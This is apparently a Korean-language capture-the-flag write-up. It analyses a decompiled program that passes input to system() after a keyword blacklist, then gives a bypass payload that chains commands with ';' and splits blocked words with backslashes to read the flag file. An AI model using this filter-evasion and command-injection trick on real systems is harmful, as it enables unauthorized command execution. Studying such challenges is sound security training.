```C
read(0, buf, 0x1FuLL);
if ( (unsigned int)filter(buf) )
    system(buf);
```
0x1F만큼 입력을 받고, filter를 통과하면 실행해준다.

```C
_BOOL8 __fastcall filter(const char *a1)
{
  if ( strncmp(a1, "ls", 2uLL) )
    return 0LL;
  if ( strstr(a1, "bin") )
    return 0LL;
  if ( strstr(a1, "sh") )
    return 0LL;
  if ( strchr(a1, 63) )
    return 0LL;
  if ( strchr(a1, 42) )
    return 0LL;
  if ( strchr(a1, 39) )
    return 0LL;
  if ( strstr(a1, "cat") )
    return 0LL;
  if ( strstr(a1, "head") )
    return 0LL;
  if ( strstr(a1, "tail") )
    return 0LL;
  if ( strstr(a1, "more") )
    return 0LL;
  if ( strstr(a1, "less") )
    return 0LL;
  if ( strstr(a1, "grep") )
    return 0LL;
  if ( strstr(a1, "awk") )
    return 0LL;
  if ( strstr(a1, "sed") )
    return 0LL;
  return strstr(a1, "flag") == 0LL;
}
```
첫 번째 if문에 의해 ls 로 시작하여야 하며, 그 뒤의 많은 문자열과 문자는 있으면 안 된다.

리눅스는 `;`으로 앞의 명령어의 성공 여부와 상관없이 한 줄에 여러 명령어를 실행시킬 수 있다. 또한 `fl\ag`와 같이 백슬래시가 문자열 사이에 띄어쓰기 없이 껴있다면 무시된다.
따라서 `ls; ca\t fl\ag`로 플래그를 읽을 수 있다.

`scpCTF{VfhQbDLZIaoQt2PzyypflOgnCTBVRK}`